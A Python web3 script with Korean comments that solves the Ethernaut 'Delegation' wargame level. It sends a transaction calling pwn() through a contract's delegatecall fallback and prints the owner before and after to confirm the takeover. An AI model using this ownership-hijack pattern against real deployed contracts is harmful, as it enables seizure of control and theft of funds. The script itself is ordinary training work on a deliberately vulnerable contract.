from web3 import Web3

# 풀이
# 1. delegatecall 기능은 A의 컨트랙트에서 B 컨트랙트 코드의 함수를 실행할때 A를 호출한 데이터를
#    유지한 상태에서 호출하는 기능을 의미함.
# 2. 이를 이용하여 실제 호출에 필요한 B 컨트랙트 함수의 코드를 안다는 가정하여 ABI를 작성한 다음
#    실제 호출은 A 컨트랙트를 향해서 B 컨트랙트 함수를 호출하는 데이터를 트랜잭션에 넘기면 풀이 가능.

# 문제에서 사용하는 각종 정보 추출
def parse_env_to_dict(env_file_path):
    env_dict = {}

    # Read the .env file line by line
    with open(env_file_path, "r") as file:
        for line in file:
            # Strip whitespace and ignore comments or empty lines
            line = line.strip()
            if not line or line.startswith("#"):
                continue

            # Split key and value on the first '='
            key, _, value = line.partition("=")
            key = key.strip()
            value = value.strip()

            # Remove quotes from the value if present
            if (value.startswith('"') and value.endswith('"')) or (value.startswith("'") and value.endswith("'")):
                value = value[1:-1]

            # Add to dictionary
            env_dict[key] = value

    return env_dict

ENV_PATH = "../.env"

dict_output = parse_env_to_dict(ENV_PATH)

RPC_URI = dict_output['WEB3_PROVIDER_URI']


CONTRACT_ADDRESS = '0xE0Ad0b727EDda6e1a583706aE76587b09B417077'
LEVEL_ADDRESS = '0x' + dict_output['ETHERNAUT_LEVEL06_ADDRESS']
USER_PRIVATE_KEY = '0x' + dict_output['FIRST_USER_ADDRESS_PRIVATE_KEY']

web3 = Web3(Web3.HTTPProvider(RPC_URI))

# 연결 확인
if web3.is_connected():
    print("Connected to Seth!")
else:
    print("Failed to connect to Seth.")
    
PA = web3.eth.account.from_key(USER_PRIVATE_KEY)
USER_ADDRESS = PA.address

CONTRACT_ABI = [
    {
        "type": "constructor",
        "inputs": [
            {
                "name": "_owner",
                "type": "address",
                "internalType": "address"
            }
        ],
        "stateMutability": "nonpayable"
    },
    {
        "type": "function",
        "name": "pwn",
        "inputs": [],
        "outputs": [],
        "stateMutability": "nonpayable"
    },
    {
        "type": "function",
        "name": "owner",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "address",
                "internalType": "address"
            }
        ],
        "stateMutability": "view",
        "constant": True
    }
]

contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)

# 공격 전 Owner 주소 확인
BEFORE_OWNER = contract.functions.owner().call()

print(f'Owner Address Before Attack: {BEFORE_OWNER}')

# 컨트랙트에 delegatecall 호출을 위한 데이터 준비
data = {
    'gas': 300000,
    'gasPrice': web3.eth.gas_price,
    'nonce': web3.eth.get_transaction_count(USER_ADDRESS),
}

tx = contract.functions.pwn().build_transaction(data)

# 트랜젝션 서명 및 전송
signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

# 트랜잭션 결과 확인
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {tx_receipt}")

# Owner 주소 변경 확인
AFTER_OWNER = contract.functions.owner().call()

print(f'Owner Address After Attack: {AFTER_OWNER}')
